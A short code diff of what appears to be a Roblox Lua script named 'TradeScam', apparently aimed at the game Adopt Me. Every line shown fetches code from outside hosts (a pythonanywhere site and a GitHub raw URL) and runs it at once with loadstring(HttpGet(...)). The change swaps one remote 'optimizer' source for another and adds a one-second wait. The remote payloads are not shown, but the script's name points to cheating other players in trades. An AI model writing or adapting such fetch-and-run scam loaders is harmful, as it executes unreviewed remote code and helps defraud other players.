@@ -1,3 +1,4 @@
 _G.scriptName = "TradeScam" -- Allows us to optimise the script for this use
 loadstring(game:HttpGet('https://doggo663.pythonanywhere.com/mainScript'))()
-loadstring(game:HttpGet('https://doggo663.pythonanywhere.com/optimizer'))()
+wait(1) -- Minimise lag by waiting
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Penguin285/AdoptMe/main/optimizer'))()
